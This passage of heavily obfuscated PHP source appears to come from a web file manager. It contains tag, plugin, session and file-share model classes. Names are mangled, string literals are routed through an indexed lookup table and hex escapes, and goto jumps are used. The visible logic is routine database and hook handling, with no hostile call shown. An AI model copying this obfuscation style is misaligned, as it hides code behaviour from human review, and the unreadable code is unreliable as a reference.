array($ÉÁ¥ß„¶[0], $¿á¤Ïï¯[2011])); } protected function get($£ÖÎÏ¢Ü) { $ŸÙßÇÖ¡ =& $_SERVER[çâ¥×ø³]; $çßÒªş = Model($ŸÙßÇÖ¡[554])->metaGet($£ÖÎÏ¢Ü, $ŸÙßÇÖ¡[2012]); $ƒ¸¶ùÙš = json_decode($çßÒªş, !0); return $ƒ¸¶ùÙš ? $ƒ¸¶ùÙš : array($ŸÙßÇÖ¡[2013] => $ŸÙßÇÖ¡[88], $ŸÙßÇÖ¡[413] => array()); } protected function set($¡÷·‰…, $º§ºñ©) { $ë¸¹«š… =& $_SERVER[çâ¥×ø³]; $º§ºñ© = $º§ºñ© ? $º§ºñ© : array($ë¸¹«š…[2013] => $ë¸¹«š…[88], $ë¸¹«š…[413] => array()); return Model($ë¸¹«š…[554])->metaSet($¡÷·‰…, $ë¸¹«š…[2012], json_encode($º§ºñ©)); } protected function getByTagID($ı¹‚°”, $ëĞğïË§) { $×—„ÂšÖ =& $_SERVER[çâ¥×ø³]; if (!$ı¹‚°” || !$ëĞğïË§) { return !1; } if (!Model($×—„ÂšÖ[554])->getInfoSimple($ı¹‚°”)) { return !1; } $ó·ÒÄÙÓ = $this->get($ı¹‚°”); if (!$ó·ÒÄÙÓ || !isset($ó·ÒÄÙÓ[$×—„ÂšÖ[413]])) { return !1; } $Ö´×Ã®µ = array_find_by_field($ó·ÒÄÙÓ[$×—„ÂšÖ[413]], $×—„ÂšÖ[443], $ëĞğïË§); return is_array($Ö´×Ã®µ) ? $Ö´×Ã®µ : !1; } public function listSource($èÓ«®·Ä, $”ûï¹õõ) { $§îÀÇ¼ =& $_SERVER[çâ¥×ø³]; if ($”ûï¹õõ && !is_array($”ûï¹õõ)) { $”ûï¹õõ = array($”ûï¹õõ); } $­×ğ®üş = $this->listData($èÓ«®·Ä); $ğãå¾›¢ = array(); foreach ($­×ğ®üş as $±ûïä°‰) { $ÂŞËû¶ = $±ûïä°‰[$§îÀÇ¼[84]]; if (!$ÂŞËû¶) { continue; } if (!isset($ğãå¾›¢[$ÂŞËû¶])) { $ğãå¾›¢[$ÂŞËû¶] = array(); } $ğãå¾›¢[$ÂŞËû¶][] = $±ûïä°‰[$§îÀÇ¼[468]]; } $×”ãîÙó = array(); foreach ($ğãå¾›¢ as $®´ßãæÈ => $’¨Ú±Î) { $¬İÎØ§¢ = !0; if (!$”ûï¹õõ) { $×”ãîÙó[] = $®´ßãæÈ; continue; } foreach ($”ûï¹õõ as $¬Ÿãë°…) { if (!in_array($¬Ÿãë°…, $’¨Ú±Î)) { $¬İÎØ§¢ = !1; break; } } if ($¬İÎØ§¢) { $×”ãîÙó[] = $®´ßãæÈ; } } if (!$×”ãîÙó) { return array(); } $Ïä‚ = array($§îÀÇ¼[459] => array($§îÀÇ¼[460], $×”ãîÙó), $§îÀÇ¼[538] => $èÓ«®·Ä, $§îÀÇ¼[178] => SourceModel::TYPE_GROUP); $û²¦å÷ = Model($§îÀÇ¼[1385])->listSource($Ïä‚); if (!$û²¦å÷ || count($×”ãîÙó) == $û²¦å÷[$§îÀÇ¼[410]][$§îÀÇ¼[411]]) { return $û²¦å÷; } $ê¾†¥¯Æ = array(); $£ğÈÑ²ö = array_to_keyvalue($û²¦å÷[$§îÀÇ¼[82]], $§îÀÇ¼[12], $§îÀÇ¼[181]); $øÈ’ÌŠ‰ = array_to_keyvalue($û²¦å÷[$§îÀÇ¼[83]], $§îÀÇ¼[12], $§îÀÇ¼[181]); $ŞÊ½©… = array_merge($øÈ’ÌŠ‰, $£ğÈÑ²ö); foreach ($×”ãîÙó as $ÂŞËû¶) { if (!in_array($ÂŞËû¶, $ŞÊ½©…)) { $ê¾†¥¯Æ[] = $ÂŞËû¶; } } if ($ê¾†¥¯Æ) { $this->removeBySource($èÓ«®·Ä, $ê¾†¥¯Æ); } return $û²¦å÷; } protected function listData($³èÛéÑü) { $“Ñˆ’ãù =& $_SERVER[çâ¥×ø³]; $Ê·óÜÓ‚ = array($“Ñˆ’ãù[1692] => 0, $“Ñˆ’ãù[525] => array($“Ñˆ’ãù[2014], 0), $“Ñˆ’ãù[464] => $“Ñˆ’ãù[2015] . $³èÛéÑü); $áõ†Æõ„ = $“Ñˆ’ãù[2016]; $ºÛÆ¸¼¥ = $this->field($áõ†Æõ„)->where($Ê·óÜÓ‚)->order($“Ñˆ’ãù[2017])->select(); return $ºÛÆ¸¼¥ ? $ºÛÆ¸¼¥ : array(); } protected function addToTag($×®¿°ØÛ, $Ÿ¿²ğ, $³ï¶Æ×÷) { $Ü öÊÙŸ =& $_SERVER[çâ¥×ø³]; if (!$this->getByTagID($×®¿°ØÛ, $³ï¶Æ×÷) || !$Ÿ¿²ğ) { return !1; } if (!Model($Ü öÊÙŸ[874])->pathInfo($Ÿ¿²ğ)) { return !1; } $’§…òæ = array($Ü öÊÙŸ[1692] => 0, $Ü öÊÙŸ[525] => $³ï¶Æ×÷, $Ü öÊÙŸ[463] => $Ÿ¿²ğ, $Ü öÊÙŸ[464] => $Ü öÊÙŸ[2018] . $×®¿°ØÛ, $Ü öÊÙŸ[462] => $Ü öÊÙŸ[12], $Ü öÊÙŸ[1903] => 0); if ($this->where($’§…òæ)->find()) { return !1; } return $this->add($’§…òæ); } protected function removeFromTag($…•¸òßÓ, $ç¼÷äÉÊ, $ƒÓâ·º›) { $¹Ï¨œ¤– =& $_SERVER[çâ¥×ø³]; if (!$this->getByTagID($…•¸òßÓ, $ƒÓâ·º›) || !$ç¼÷äÉÊ) { return !1; } if (is_array($ç¼÷äÉÊ)) { $ç¼÷äÉÊ = array($¹Ï¨œ¤–[7], $ç¼÷äÉÊ); } $º™ï•Ü = array($¹Ï¨œ¤–[1692] => 0, $¹Ï¨œ¤–[525] => $ƒÓâ·º›, $¹Ï¨œ¤–[464] => $¹Ï¨œ¤–[2018] . $…•¸òßÓ, $¹Ï¨œ¤–[463] => $ç¼÷äÉÊ); return $this->where($º™ï•Ü)->delete(); } protected function removeByTag($ËÊÚì‘, $‰Â»²•) { $„ÄıºÏ¡ =& $_SERVER[çâ¥×ø³]; if (!$this->getByTagID($ËÊÚì‘, $‰Â»²•)) { return !1; } $ıÕÆ«ô¤ = array($„ÄıºÏ¡[1692] => 0, $„ÄıºÏ¡[525] => $‰Â»²•, $„ÄıºÏ¡[464] => $„ÄıºÏ¡[2018] . $ËÊÚì‘); return $this->where($ıÕÆ«ô¤)->delete(); } protected function removeBySource($¬Ä¥úÓ˜, $ÂÛ’Û“) { $Öáœßšğ =& $_SERVER[çâ¥×ø³]; if (!$¬Ä¥úÓ˜ || !$ÂÛ’Û“) { return !1; } if (is_array($ÂÛ’Û“)) { $ÂÛ’Û“ = array($Öáœßšğ[7], $ÂÛ’Û“); } $”û²É « = array($Öáœßšğ[1692] => 0, $Öáœßšğ[463] => $ÂÛ’Û“, $Öáœßšğ[525] => array($Öáœßšğ[1067], 0), $Öáœßšğ[464] => $Öáœßšğ[2018] . $¬Ä¥úÓ˜); return $this->where($”û²É «)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\160\x6c\165\x67\x69\156\x4c\151\x73\x74"; public $field = array("\156\141\x6d\145", "\x73\x74\141\x74\165\x73", "\x72\x65\x67\x69\145\x73\x74", "\x63\x6f\x6e\x66\x69\147"); public function loadList($Ş´Âš¨å = false) { $Ò¤áÃ¾ï = array_to_keyvalue($this->listData(), $_SERVER[çâ¥×ø³][32]); if ($Ş´Âš¨å) { return $Ò¤áÃ¾ï[$Ş´Âš¨å]; } return $Ò¤áÃ¾ï; } public function init() { $€ÂºÏÍ° =& $_SERVER[çâ¥×ø³]; Hook::trigger($€ÂºÏÍ°[2019]); $Û—ìë¶¨ = $this->loadPluginList(); foreach ($Û—ìë¶¨ as $·ÑßÙ => $­¢šüÕõ) { $àŞ­Ê’ = $this->appAllow($·ÑßÙ, $­¢šüÕõ); if (!$àŞ­Ê’) { continue; } foreach ($­¢šüÕõ[$€ÂºÏÍ°[2020]] as $±““èë· => $ÆÛü‘ĞÙ) { Hook::bind($±““èë·, $ÆÛü‘ĞÙ); } } Hook::trigger($€ÂºÏÍ°[2021]); Hook::trigger(ACTION); } public function appAllow($Şê˜µŸ, $¨è¥Ÿ¡Ä, $ßà“ˆ—¥ = true) { $™òÄÙµ‚ =& $_SERVER[çâ¥×ø³]; $óÊÁÍñ = PLUGIN_DIR . $Şê˜µŸ . $™òÄÙµ‚[2022]; if (!is_array($¨è¥Ÿ¡Ä) || !is_array($¨è¥Ÿ¡Ä[$™òÄÙµ‚[2020]]) || $¨è¥Ÿ¡Ä[$™òÄÙµ‚[799]] != 1 || !is_file($óÊÁÍñ)) { return !1; } if ($GLOBALS[$™òÄÙµ‚[536]] == 1) { if ($GLOBALS[$™òÄÙµ‚[6]][$™òÄÙµ‚[2023]] || !$GLOBALS[$™òÄÙµ‚[6]][$™òÄÙµ‚[2024]]) { return !0; } $ßÜŸ¤ = explode($™òÄÙµ‚[50], strtolower($GLOBALS[$™òÄÙµ‚[6]][$™òÄÙµ‚[2024]])); return in_array(strtolower($Şê˜µŸ), $ßÜŸ¤) ? !1 : !0; } if ($ßà“ˆ—¥ && !Action($™òÄÙµ‚[2025])->checkAuth($Şê˜µŸ)) { return !1; } return !0; } public function unInstall($îÉÓØê) { $‘Ğ¸­úš =& $_SERVER[çâ¥×ø³]; $‡ì¦ñ¶ğ = $this->loadList($îÉÓØê); if (file_exists(PLUGIN_DIR . $îÉÓØê)) { Hook::apply($îÉÓØê . $‘Ğ¸­úš[2026]); } $this->remove($‡ì¦ñ¶ğ[$‘Ğ¸­úš[443]]); } public function changeStatus($ìÆÓÉÜÆ, $·ØÖü¿ ) { $®™ÙÜªÔ =& $_SERVER[çâ¥×ø³]; $Ò™Ãƒ÷¶ = $this->loadList($ìÆÓÉÜÆ); if ($·ØÖü¿ ) { Hook::apply($ìÆÓÉÜÆ . $®™ÙÜªÔ[2027]); } $this->update($Ò™Ãƒ÷¶[$®™ÙÜªÔ[443]], array($®™ÙÜªÔ[2028] => $·ØÖü¿ )); } public function appRegist($âÖ™ß°‘, $ìÊµ†ëî) { $×ø«ˆû§ =& $_SERVER[çâ¥×ø³]; $Ç˜·ÀŸ˜ = $this->loadList($âÖ™ß°‘); if ($Ç˜·ÀŸ˜) { $this->update($Ç˜·ÀŸ˜[$×ø«ˆû§[443]], array($×ø«ˆû§[2020] => $ìÊµ†ëî)); } else { $û†åŸæ“ = array($×ø«ˆû§[32] => $âÖ™ß°‘, $×ø«ˆû§[2020] => $ìÊµ†ëî, $×ø«ˆû§[799] => 0, $×ø«ˆû§[6] => $this->getConfigDefault($âÖ™ß°‘)); $this->insert($û†åŸæ“); } } public function getConfigDefault($¯ª¹Ï»Ê) { $¨†üçò =& $_SERVER[çâ¥×ø³]; $ùÍŠÄŒŒ = array(); $çò¯ªÂ£ = $this->getPackageJson($¯ª¹Ï»Ê); if (!$çò¯ªÂ£ && is_array($çò¯ªÂ£[$¨†üçò[2029]])) { return $ùÍŠÄŒŒ; } foreach ($çò¯ªÂ£[$¨†üçò[2029]] as $Ùó¿»µ› => $’Êà–ı) { if (!isset($’Êà–ı[$¨†üçò[418]]) || isset($ùÍŠÄŒŒ[$Ùó¿»µ›])) { continue; } $ùÍŠÄŒŒ[$Ùó¿»µ›] = $’Êà–ı[$¨†üçò[418]]; } return $ùÍŠÄŒŒ; } public function getPackageJson($åáÅ´åø) { return Hook::apply($åáÅ´åø . $_SERVER[çâ¥×ø³][2030]); } public function getConfig($ê˜¿½³Â, $»åÜÄÉï = false) { $¸¬Á€µâ =& $_SERVER[çâ¥×ø³]; $œöıú = array(); $æ¬ÈÁÑø = $this->loadList($ê˜¿½³Â); if ($æ¬ÈÁÑø && is_array($æ¬ÈÁÑø[$¸¬Á€µâ[6]])) { $œöıú = $æ¬ÈÁÑø[$¸¬Á€µâ[6]]; } if (!$œöıú || $»åÜÄÉï) { $œöıú = $this->getConfigDefault($ê˜¿½³Â); } return $œöıú; } public function setConfig($ÚéÜêÃË, $»™îç¨Ã = false) { $—œ¶ë =& $_SERVER[çâ¥×ø³]; $°¦ãßö = $this->loadList($ÚéÜêÃË); if (!$°¦ãßö) { return !1; } $ÙäˆòÅÂ = $°¦ãßö[$—œ¶ë[6]]; if ($»™îç¨Ã == !1) { $ÙäˆòÅÂ = array(); $»™îç¨Ã = $this->getConfigDefault($ÚéÜêÃË); } foreach ($»™îç¨Ã as $†İõñ›¸ => $ØÓ†àÛ¢) { $ÙäˆòÅÂ[$†İõñ›¸] = is_string($ØÓ†àÛ¢) ? trim($ØÓ†àÛ¢) : $ØÓ†àÛ¢; } $this->update($°¦ãßö[$—œ¶ë[443]], array($—œ¶ë[6] => $ÙäˆòÅÂ)); } public function viewList() { $Ñ‘ÇÎÓ× =& $_SERVER[çâ¥×ø³]; $ÀÆ½ö¨ø = $this->loadList(); $this->pluginScan($ÀÆ½ö¨ø); $ÀÆ½ö¨ø = $this->loadPluginList(); $¯í†ºç¹ = array(); foreach ($ÀÆ½ö¨ø as $’õ£«¸ã => $¸Ö¤½ış) { unset($¸Ö¤½ış[$Ñ‘ÇÎÓ×[2020]], $¸Ö¤½ış[$Ñ‘ÇÎÓ×[6]]); $à¦± «Ç = PLUGIN_DIR . $¸Ö¤½ış[$Ñ‘ÇÎÓ×[32]] . $Ñ‘ÇÎÓ×[2022]; if (!is_file($à¦± «Ç)) { continue; } $Äëõšëæ = Hook::apply($¸Ö¤½ış[$Ñ‘ÇÎÓ×[32]] . $Ñ‘ÇÎÓ×[2030]); if (is_array($Äëõšëæ)) { $¯í†ºç¹[$’õ£«¸ã] = array_merge($¸Ö¤½ış, $Äëõšëæ); } } return $¯í†ºç¹; } private function loadPluginList() { $ÌŞô…Í =& $_SERVER[çâ¥×ø³]; $½Ø•ö‚š = $this->loadList(); if (strtolower(MOD) == $ÌŞô…Í[2031]) { return $½Ø•ö‚š; } $ËÓ–Øº = Hook::trigger($ÌŞô…Í[2032], $½Ø•ö‚š); if ($½Ø•ö‚š && !$ËÓ–Øº) { die; } return $ËÓ–Øº ? $ËÓ–Øº : $½Ø•ö‚š; } private function pluginScan($ÚÈ†„—) { $çÈ°ôÍ– =& $_SERVER[çâ¥×ø³]; recursion_dir(PLUGIN_DIR, $‹²…¨è, $Õèª­Ãê, 0); foreach ($‹²…¨è as $‡æãæ¹µ) { $´ËŠìù = get_path_this($‡æãæ¹µ); if (isset($ÚÈ†„—[$´ËŠìù]) || !file_exists($‡æãæ¹µ . $çÈ°ôÍ–[2033]) || !file_exists($‡æãæ¹µ . $çÈ°ôÍ–[2022])) { continue; } Hook::apply($´ËŠìù . $çÈ°ôÍ–[2027]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\x74\145\155\x5f\x73\x65\x73\163\x69\x6f\x6e"; public function get($¤é©çÚ‹) { $äÜèñí½ =& $_SERVER[çâ¥×ø³]; $ûŞŒ¬‘ò = $this->where(array($äÜèñí½[2034] => $¤é©çÚ‹))->find(); if (!is_array($ûŞŒ¬‘ò)) { return !1; } return $ûŞŒ¬‘ò[$äÜèñí½[803]]; } public function set($Ëºô°ÛÉ, $æš‘ë²Ş, $èï€Á´µ = 3600) { $°à¬öÒÁ =& $_SERVER[çâ¥×ø³]; $˜¡Ğ…¹‰ = array($°à¬öÒÁ[2034] => $Ëºô°ÛÉ, $°à¬öÒÁ[1938] => $æš‘ë²Ş, $°à¬öÒÁ[2035] => $èï€Á´µ + time()); if (Session::get($°à¬öÒÁ[2036])) { $˜¡Ğ…¹‰[$°à¬öÒÁ[1701]] = Session::get($°à¬öÒÁ[2036]); } else { $˜¡Ğ…¹‰[$°à¬öÒÁ[1701]] = 0; } if ($this->get($Ëºô°ÛÉ)) { return $this->where(array($°à¬öÒÁ[2034] => $Ëºô°ÛÉ))->save($˜¡Ğ…¹‰); } else { return $this->add($˜¡Ğ…¹‰, array(), !0); } } public function remove($ Ş·Ê‚Ş) { return $this->where(array($_SERVER[çâ¥×ø³][2034] => $ Ş·Ê‚Ş))->delete(); } public function clearTimeout() { return $this->where($_SERVER[çâ¥×ø³][2037] . time())->delete(); } } goto B¯‰Â½¤Â ; EÛ†Ãí: class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\x72\x65"; protected $dataAuto = array(array("\x6d\157\144\x69\x66\x79\124\151\155\x65", "\x74\x69\x6d\x65", "\x69\156\163\145\162\x74\54\165\160\144\x61\164\145", "\x66\165\x6e\143\164\x69\x6f\156"), array("\143\x72\x65\141\x74\145\x54\151\155\x65", "\x74\151\155\145", "\151\156\163\145\162\164", "\x66\165\x6e\143\164\151\x6f\156"), array("\x6f\160\x74\151\157\x6e\163", '', "\x69\156\163\145\162\164\x2c\165\160\x64\x61\x74\x65\54\x73\145\154\x65\x63\164", "\x6a\163\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($Ú’ô×Ü) { $íü•„ûŸ =& $_SERVER[çâ¥×ø³]; $ˆİ”ì¢ = isset($Ú’ô×Ü[0]) ? $Ú’ô×Ü[0] : !1; return array($íü•„ûŸ[2038] => array(USER_ID, $íü•„ûŸ[2039]), $íü•„ûŸ[1979] => array($ˆİ”ì¢, $íü•„ûŸ[2040])); } protected function listSimple() { $ğ­‹íÏ× = array($_SERVER[çâ¥×ø³][1701] => USER_ID); $„‰ğÏÒ† = $this->field($this->fieldList)->where($ğ­‹íÏ×)->select(); return $„‰ğÏÒ† ? $„‰ğÏÒ† : array(); } protected function getInfo($¿éç’Â, $·±â¹ÄÏ = false) { $†è›ÍšĞ =& $_SERVER[çâ¥×ø³]; if ($·±â¹ÄÏ) { return $this->_getShareInfo(array($†è›ÍšĞ[633] => $¿éç’Â)); } $ÊĞò‰å = $this->cacheFunctionGet($†è›ÍšĞ[1981], $¿éç’Â); return $ÊĞò‰å; } public function getInfoByHash($”øåÕ´») { return $this->_getShareInfo(array($_SERVER[çâ¥×ø³][2041] => $”øåÕ´»)); } public function getInfoByPath($ü‡–ãú») { $¥à£ëéÈ =& $_SERVER[çâ¥×ø³]; $Ì²‡Ò½¶ = array($¥à£ëéÈ[1701] => USER_ID, $¥à£ëéÈ[181] => $ü‡–ãú»); return $this->_getShareInfo($Ì²‡Ò½¶); } public function getInfoBySourcePath($á…½™ñ) { $†Ä¡³² =& $_SERVER[çâ¥×ø³]; $¢˜»ßæ = array($†Ä¡³²[1701] => USER_ID, $†Ä¡³²[1228] => $á…½™ñ); return $this->_getShareInfo($¢˜»ßæ); } private function _getShareInfo($²³Ğ·ù) { $¶æƒ±ìÃ =& $_SERVER[çâ¥×ø³]; $Èœó…€à = $this->where($²³Ğ·ù)->find(); if (!$Èœó…€à) { return !1; } $²³Ğ·ù = array($¶æƒ±ìÃ[633] => $Èœó…€à[$¶æƒ±ìÃ[633]]); $ª‹é‹™— = $¶æƒ±ìÃ[2042]; $øãĞ‚µ = Model($¶æƒ±ìÃ[634])->order($¶æƒ±ìÃ[443])->field($ª‹é‹™—)->where($²³Ğ·ù)->select(); if ($Èœó…€à[$¶æƒ±ìÃ[181]] == $¶æƒ±ìÃ[212]) { $Èœó…€à[$¶æƒ±ìÃ[87]] = IO::info($Èœó…€à[$¶æƒ±ìÃ[1228]]); } else { $Èœó…€à[$¶æƒ±ìÃ[87]] = Model($¶æƒ±ìÃ[1385])->pathInfo($Èœó…€à[$¶æƒ±ìÃ[181]]); } $Èœó…€à[$¶æƒ±ìÃ[2043]] = $øãĞ‚µ; return $Èœó…€à; } protected function getInfoAuth($ÌÕó§…ï) { $Šã¸½µ¿ =& $_SERVER[çâ¥×ø³]; $“ü½»÷Ë = $this->getInfo($ÌÕó§…ï); if ($“ü½»÷Ë[$Šã¸½µ¿[1701]] == USER_ID) { $“ü½»÷Ë[$Šã¸½µ¿[455]] = $“ü½»÷Ë[$Šã¸½µ¿[87]][$Šã¸½µ¿[455]]; } else { $“ü½»÷Ë[$Šã¸½µ¿[455]] = Model($Šã¸½µ¿[535])->authMake($“ü½»÷Ë[$Šã¸½µ¿[2043]]); } return $“ü½»÷Ë; } protected function listData($ˆ¹ÈáÃ = null, $²Öˆç” = 300) { $×ôÎ‘î =& $_SERVER[çâ¥×ø³]; $Ì úŞ­Š = array(array($×ôÎ‘î[530] => array($×ôÎ‘î[1065], 0), $×ôÎ‘î[631] => array($×ôÎ‘î[1065], 0), $×ôÎ‘î[2044] => $×ôÎ‘î[1997])); if ($ˆ¹ÈáÃ == $×ôÎ‘î[2045]) { $Ì úŞ­Š = array($×ôÎ‘î[530] => 1); } else { if ($ˆ¹ÈáÃ == $×ôÎ‘î[1214]) { $Ì úŞ­Š = array($×ôÎ‘î[631] => 1); } } $Ì úŞ­Š[$×ôÎ‘î[1701]] = USER_ID; $×‘‰Û½« = $this->where($Ì úŞ­Š)->selectPage($²Öˆç”); return $×‘‰Û½«; } protected function listToMe($ååßıàô = 300) { $õÔğ÷² =& $_SERVER[çâ¥×ø³]; $ÔÊÀ’Œ = Model($õÔğ÷²[2046])->userGroupParents(USER_ID); $ÃÁ¯ó™ = array($õÔğ÷²[616] => SourceModel::TYPE_USER, $õÔğ÷²[538] => USER_ID); if ($ÔÊÀ’Œ) { $ÃÁ¯ó™ = array(array($õÔğ÷²[616] => SourceModel::TYPE_USER, $õÔğ÷²[538] => USER_ID), array($õÔğ÷²[616] => SourceModel::TYPE_GROUP, $õÔğ÷²[538] => array($õÔğ÷²[7], $ÔÊÀ’Œ)), $õÔğ÷²[2044] => $õÔğ÷²[1997]); } $ò»¶¬ûñ = Model($õÔğ÷²[634])->where($ÃÁ¯ó™)->selectPage($ååßıàô); $ÆãĞ—“” = array_to_keyvalue_group($ò»¶¬ûñ[$õÔğ÷²[413]], $õÔğ÷²[633]); if (!$ÆãĞ—“”) { return $ò»¶¬ûñ; } $œº³’ÆÜ = $õÔğ÷²[2047]; $ÃÁ¯ó™ = array($õÔğ÷²[633] => array($õÔğ÷²[460], array_keys($ÆãĞ—“”)), $õÔğ÷²[1701] => array($õÔğ÷²[1067], $õÔğ÷²[212])); $œ¦¦§Üí = $this->field($œº³’ÆÜ)->where($ÃÁ¯ó™)->select(); foreach ($œ¦¦§Üí as $ìÌĞæäÕ => &$áŸ€—œØ) { $áŸ€—œØ[$õÔğ÷²[2043]] = $ÆãĞ—“”[$áŸ€—œØ[$õÔğ÷²[633]]]; } unset($áŸ€—œØ); $®‚¬ = array($õÔğ÷²[2048] => $œ¦¦§Üí, $õÔğ÷²[2049] => $ò»¶¬ûñ[$õÔğ÷²[410]]); return $®‚¬; } protected function shareAdd($ã—»ÖŞ„, $ï’‡óÆ) { $€Ÿ¹§¼ =& $_SERVER[çâ¥×ø³]; $ØäÅ¢—Ù = $this->_addShareData($ã—»ÖŞ„, $ï’‡óÆ); if (!empty($ï’‡óÆ[$€Ÿ¹§¼[2050]])) { $this->_shareAuthSet($ØäÅ¢—Ù, $ï’‡óÆ[$€Ÿ¹§¼[2050]]); } $this->shareEventAdd($ã—»ÖŞ„, $ï’‡óÆ, $€Ÿ¹§¼[2051]); return $ØäÅ¢—Ù; } protected function shareAddSystem($ªÕàùÑ¤, $‘È¼«®Ü) { $“˜±•â¥ =& $_SERVER[çâ¥×ø³]; $ö°Š·‹µ = $this->_addShareData($ªÕàùÑ¤, $‘È¼«®Ü, $“˜±•â¥[179]); $this->_shareAuthSet($ö°Š·‹µ, $‘È¼«®Ü[$“˜±•â¥[2050]]); return $ö°Š·‹µ; } private function shareEventAdd($Šˆõ…Î, $‰‡ß­‚ş, $£¿‚Ô = "\x61\x64\144") { $Åóë¼©¨ =& $_SERVER[çâ¥×ø³]; if (!$Šˆõ…Î || $Šˆõ…Î == $Åóë¼©¨[212]) { return; } if ($£¿‚Ô == $Åóë¼©¨[2051]) { if ($‰‡ß­‚ş[$Åóë¼©¨[530]] == $Åóë¼©¨[88]) { Model($Åóë¼©¨[601])->eventShare($Šˆõ…Î, $Åóë¼©¨[2052]); } if ($‰‡ß­‚ş[$Åóë¼©¨[631]] == $Åóë¼©¨[88]) { Model($Åóë¼©¨[601])->eventShare($Šˆõ…Î, $Åóë¼©¨[2053]); } return; } $£±à¦ëû = $this->getInfoByPath($Šˆõ…Î); $æ»ÎİÜû = $Åóë¼©¨[2054]; if ($£±à¦ëû[$Åóë¼©¨[530]] == $Åóë¼©¨[212] && $‰‡ß­‚ş[$Åóë¼©¨[530]] == $Åóë¼©¨[88]) { $æ»ÎİÜû = $Åóë¼©¨[2052]; } if ($£±à¦ëû[$Åóë¼©¨[530]] == $Åóë¼©¨[88] && $‰‡ß­‚ş[$Åóë¼©¨[530]] == $Åóë¼©¨[212]) { $æ»ÎİÜû = $Åóë¼©¨[2055]; } if ($£±à¦ëû[$Åóë¼©¨[631]] == $Åóë¼©¨[212] && $‰‡ß­‚ş[$Åóë¼©¨[631]] == $Åóë¼©¨[88]) { $æ»ÎİÜû = $Åóë¼©¨[2053]; } if ($£±à¦ëû[$Åóë¼©¨[631]] == $Åóë¼©¨[88] && $‰‡ß­‚ş[$Åóë¼©¨[631]] == $Åóë¼©¨[212]) { $æ»ÎİÜû = $Åóë¼©¨[2056]; } Model($Åóë¼©¨[601])->eventShare($Šˆõ…Î, $æ»ÎİÜû); return; } private function _addShareData($›Ö†°°À, $Éœ”Ââï = array(), $Ü«®„‰Ë = false) { $ùÛúø×Ã =& $_SERVER[çâ¥×ø³]; $¸·ÍŒì‘ = $Ü«®„‰Ë == $ùÛúø×Ã[179] ? 0 : USER_ID; $´ª©×ü£ = array($ùÛúø×Ã[459] => $›Ö†°°À, $ùÛúø×Ã[1692] => $¸·ÍŒì‘); if ($›Ö†°°À == 0) { $´ª©×ü£ = array($ùÛúø×Ã[2057] => $Éœ”Ââï[$ùÛúø×Ã[1228]], $ùÛúø×Ã[1692] => $¸·ÍŒì‘); } if ($¦ã€Ö¶ = $this->where($´ª©×ü£)->find()) { return $¦ã€Ö¶[$ùÛúø×Ã[633]]; } if ($›Ö†°°À == 0) { $¢Óí¥  = array($ùÛúø×Ã[32] => get_path_this($Éœ”Ââï[$ùÛúø×Ã[84]])); } else { $¢Óí¥  = Model($ùÛúø×Ã[874])->sourceInfo($›Ö†°°À); if (!$¢Óí¥ ) { return !1; } } if (!$Éœ”Ââï[$ùÛúø×Ã[1598]]) { $Éœ”Ââï[$ùÛúø×Ã[1598]] = $¢Óí¥ [$ùÛúø×Ã[32]]; } $ˆòóö÷ó = array($ùÛúø×Ã[1692] => $¸·ÍŒì‘, $ùÛúø×Ã[459] => $›Ö†°°À, $ùÛúø×Ã[1598] => $ùÛúø×Ã[12], $ùÛúø×Ã[530] => 0, $ùÛúø×Ã[631] => 0, $ùÛúø×Ã[1228] => $ùÛúø×Ã[12], $ùÛúø×Ã[351] => $ùÛúø×Ã[12], $ùÛúø×Ã[942] => $ùÛúø×Ã[12], $ùÛúø×Ã[2058] => 0, $ùÛúø×Ã[2059] => 0, $ùÛúø×Ã[810] => 0, $ùÛúø×Ã[2060] => $ùÛúø×Ã[12], $ùÛúø×Ã[2041] => $ùÛúø×Ã[12]); $â¼…ÃË = explode($ùÛúø×Ã[50], $ùÛúø×Ã[2061]); foreach ($â¼…ÃË as $„¯Æ•Úñ) { if (!isset($Éœ”Ââï[$„¯Æ•Úñ])) { continue; } $ˆòóö÷ó[$„¯Æ•Úñ] = $Éœ”Ââï[$„¯Æ•Úñ]; } $¯Åõ” = $this->add($ˆòóö÷ó); $ĞèµÑ“ = array($ùÛúø×Ã[2041] => short_id($¯Åõ”)); $this->where(array($ùÛúø×Ã[2062] => $¯Åõ”))->save($ĞèµÑ“); return $¯Åõ”; } private function _shareAuthSet($Ë«ùÕÄ©, $ßó¨Ğ‰) { $¶™Ëû¬¨ =& $_SERVER[çâ¥×ø³]; if (!is_array($ßó¨Ğ‰)) { return !1; } $“œŸúÀ› = Model($¶™Ëû¬¨[2007]); $“œŸúÀ›->where(array($¶™Ëû¬¨[633] => $Ë«ùÕÄ©))->delete(); $Ò£ì°ÑÚ = array(); foreach ($ßó¨Ğ‰ as $î´«¡ÁŠ) { $Ãúöš = SourceModel::TYPE_USER; if ($î´«¡ÁŠ[$¶™Ëû¬¨[178]] == SourceModel::TYPE_GROUP) { $Ãúöš = SourceModel::TYPE_GROUP; } $‰Õü‰¾ı = array($¶™Ëû¬¨[633] => $Ë«ùÕÄ©, $¶™Ëû¬¨[178] => $Ãúöš, $¶™Ëû¬¨[538] => intval($î´«¡ÁŠ[$¶™Ëû¬¨[538]]), $¶™Ëû¬¨[2003] => 0, $¶™Ëû¬¨[2063] => -1); if ($î´«¡ÁŠ[$¶™Ëû¬¨[2003]]) { $‰Õü‰¾ı[$¶™Ëû¬¨[2003]] = $î´«¡ÁŠ[$¶™Ëû¬¨[2003]]; } else { if ($î´«¡ÁŠ[$¶™Ëû¬¨[2063]]) { $‰Õü‰¾ı[$¶™Ëû¬¨[2063]] = $î´«¡ÁŠ[$¶™Ëû¬¨[2063]]; } } $Ò£ì°ÑÚ[] = $‰Õü‰¾ı; } return $“œŸúÀ›->addAll($Ò£ì°ÑÚ, array(), !0); } public function numViewAdd($ı–ĞŠ ”) { $Çå±ç¦Ê =& $_SERVER[çâ¥×ø³]; $êßàşÉí = array($Çå±ç¦Ê[2062] => $ı–ĞŠ ”); $this->where($êßàşÉí)->setAdd($Çå±ç¦Ê[2058]); } public function numDownloadAdd($›ú”ØÓš) { $²Ôß–»Ï =& $_SERVER[çâ¥×ø³]; $ôÃã–¹µ = array($²Ôß–»Ï[2062] => $›ú”ØÓš); $this->where($ôÃã–¹µ)->setAdd($²Ôß–»Ï[2059]); } protected function shareEdit($¾®çºñÜ, $ñ‡¶ÊÑ) { 